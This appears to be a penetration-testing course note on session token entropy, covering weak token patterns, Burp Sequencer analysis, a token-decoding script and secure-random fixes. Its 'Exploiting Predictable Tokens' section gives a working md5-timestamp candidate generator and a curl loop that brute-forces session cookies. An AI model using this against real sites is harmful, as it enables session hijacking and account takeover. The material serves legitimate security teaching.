---
tags: [vapt, session-management, intermediate]
difficulty: intermediate
module: "17 - Session Management"
topic: "17.02 Session Token Entropy and Predictability"
---

# 17.02 — Session Token Entropy and Predictability

## What Is Entropy?

```
ENTROPY = measure of randomness/unpredictability

HIGH ENTROPY: 
  a3f8b2e1c9d4f7a2b8c3d9e4f1a6b2c8d3e9f4a1b7c2d8e3f9a4b1c7
  → Looks random, no pattern, hard to guess
  
LOW ENTROPY:
  session_1234
  abc123456
  1640000000  (Unix timestamp)
  user42_session
  → Patterns visible, guessable!
```

---

## Weak Token Patterns

```
1. SEQUENTIAL:
   session_1001, session_1002, session_1003
   → Get your token 1001 → victim's next login = 1002 → hijack!
   
2. TIMESTAMP-BASED:
   sess_1640000000 (seconds since epoch)
   sess_20240115103045 (date+time)
   → Generate all timestamps in the window → find valid session!
   
3. USERNAME + TIMESTAMP:
   alice_1640000000
   → Know username + approximate login time → few guesses!
   
4. SHORT TOKEN:
   6-digit hex: aabbcc = 16^6 = 16 million combos
   At 1000 req/sec → 4.4 hours to enumerate all!
   32-digit hex: 16^32 = 3.4 × 10^38 → impossible to brute force
   
5. BASE64 OF USERID:
   echo "42" | base64 → "NDI="
   Increment userid → encode → try → session walking!
   
6. PREDICTABLE RANDOM (PRNG):
   If server uses weak PRNG (not cryptographically secure):
   Predict future tokens from observed tokens!
   PHP: mt_rand() (Mersenne Twister) → predictable!
   vs: random_bytes() → secure
```

---

## Testing with Burp Sequencer

```
BURP SEQUENCER — ANALYZES TOKEN RANDOMNESS:

STEP 1: Capture token generation
  Login multiple times → capture the Set-Cookie responses
  OR: Identify the login endpoint response with session cookie
  
STEP 2: Send to Sequencer
  Burp → HTTP History → right-click response → Send to Sequencer
  
STEP 3: Configure
  Token Location: Cookie value → select "session" cookie
  Click "Start live capture" → Burp sends many login requests, collects tokens
  
STEP 4: Analyze
  Minimum 100 tokens for meaningful analysis
  Burp calculates FIPS test results
  
  GREEN (pass): High entropy, well distributed → secure!
  RED (fail):   Low entropy, patterns detected → investigate!
  
STEP 5: Manual Analysis
  Look at captured tokens visually:
  - Are they all the same length? (yes = consistent, good)
  - Do they share prefixes? (yes = bad)
  - Do they incrementally change? (yes = sequential = very bad)
```

---

## Manual Analysis Script

```python
import base64
import hashlib
import time

tokens = [
    "YWxpY2U6MTY0MDAwMDAwMA==",  # alice:1640000000
    "YWxpY2U6MTY0MDAwMDAwMQ==",  # alice:1640000001
    # ... collect from app
]

# Decode and analyze:
for t in tokens:
    try:
        decoded = base64.b64decode(t).decode()
        print(f"Token: {t} → Decoded: {decoded}")
    except:
        print(f"Token: {t} → Not base64")

# Check if hex encoded timestamp:
for t in tokens:
    try:
        ts = int(t, 16)
        print(f"{t} → as timestamp: {time.ctime(ts)}")
    except:
        pass

# Check if sequential:
if all(t.isdigit() for t in tokens):
    diffs = [int(tokens[i+1]) - int(tokens[i]) for i in range(len(tokens)-1)]
    print(f"Diffs: {diffs}")  # all same? → sequential!
```

---

## Exploiting Predictable Tokens

```
SCENARIO: Session is sequential integer (base10)
  Your session ID: 10042
  Victim logged in shortly after you: probably 10043 or 10044
  
  Try:
  Cookie: session=10043
  Cookie: session=10044
  → If any returns you to a logged-in page → session hijack!

SCENARIO: Session is md5(timestamp)
  Victim logged in at approximately 2024-01-15 10:30
  
  python3 -c "
  import hashlib, time
  from datetime import datetime
  
  # Login time range: 10:29:00 to 10:31:00
  start = int(datetime(2024,1,15,10,29,0).timestamp())
  end = int(datetime(2024,1,15,10,31,0).timestamp())
  
  for t in range(start, end+1):
      h = hashlib.md5(str(t).encode()).hexdigest()
      print(h)
  " > candidate_sessions.txt
  
  # Try each candidate:
  for session in $(cat candidate_sessions.txt); do
      curl -s -o /dev/null -w "$session: %{http_code}\n" \
        https://target.com/account \
        -H "Cookie: session=$session"
  done
```

---

## Fix

```
USE CRYPTOGRAPHICALLY SECURE RANDOM:

Python:
  import secrets
  session_id = secrets.token_hex(32)  # 256-bit = 64 hex chars

PHP:
  $session_id = bin2hex(random_bytes(32));  // 256-bit hex

Node.js:
  const crypto = require('crypto');
  const sessionId = crypto.randomBytes(32).toString('hex');

Java:
  SecureRandom sr = new SecureRandom();
  byte[] bytes = new byte[32];
  sr.nextBytes(bytes);
  String sessionId = Base64.getEncoder().encodeToString(bytes);

REQUIREMENTS:
  ✓ 128-bit minimum entropy (256-bit recommended)
  ✓ Use CSPRNG (cryptographically secure pseudorandom number generator)
  ✓ Never include user info (userid, username, timestamp) in session token
  ✓ Never use MD5/SHA1 of predictable data
```

---

## Related Notes
- [[01 - What is a Session]] — session fundamentals
- [[03 - Session Fixation]] — forcing a known session ID on victim
- [[15 - Defense Secure Session Configuration]] — full hardening
